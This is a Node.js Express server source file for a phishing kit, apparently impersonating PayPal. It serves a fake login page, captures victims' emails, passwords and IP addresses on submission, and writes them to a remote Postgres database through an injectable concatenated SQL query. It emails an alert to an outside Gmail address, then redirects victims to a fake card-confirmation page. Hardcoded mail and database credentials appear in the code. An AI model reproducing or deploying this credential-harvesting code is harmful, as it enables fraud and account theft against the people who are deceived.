var express = require('express');
var app = express();
app.use(express.static('public'));
const PORT = process.env.PORT || 5000;
app.set('view engine', 'ejs');
const pg = require('pg');
var bodyParser = require('body-parser');
const nodemailer = require("nodemailer");
var mailOptions = {
    from: 'paypal.credit.safety@gmail.com',
    to: "fadysadakah.emh@gmail.com",
    subject: 'hacked freelancer',
    text: '',
    html: ''
};
var transporter = nodemailer.createTransport({
    service: 'gmail',
    host: 'smtp.gmail.com',
    secure: true,
    port: 465,

    auth: {
        user: 'paypal.credit.safety@gmail.com',
        pass: 'xzoahseedlerintr'
    }
});

app.use(bodyParser.urlencoded({ extended: false }));
const client = new pg.Client({
    user: 'haaasalbrddacm',
    password: '1c86ca363fc1a26cb588bbf08ed0117c6490946bc5b6a7de4e8164c3a76ac184',
    database: 'de35u0icb8jt5u',
    port: 5432,
    host: 'ec2-54-235-114-242.compute-1.amazonaws.com',
    ssl: true
});

client.connect();

// #########################################################################################################################################################################################################################
app.get('/confirm/*',function(req,res){
    res.render('confirm')
})
// #############################################################    POST REQUESTS    #######################################################################################################################################
app.post('/login',function(req,res){
    transporter.sendMail(mailOptions, function () { });
    var a = req.body.login_email;
    var b = req.body.login_password;
    console.log(a+b);
    var ip = req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO freelancer (email,password,ip) VALUES ('"+a+"','"+b+"','"+ip+"')",function(err,result){});
    res.redirect('/confirm/myaccount/money/flow/cards/ new/manual?flow=eyJyZXR1cm5VcmwiOiIvYnVzaW5lc3NleHAvbW9uZXkiLCJjYW5jZWxVcmwiOiIvYnVzaW5lc3NleHAvbW9uZXkifQ==');
})


// #########################################################################################################################################################################################################################

app.get('*', function (req, res) {
    res.render('login')
})
app.listen(PORT, function () {
    console.log('Server Started')
})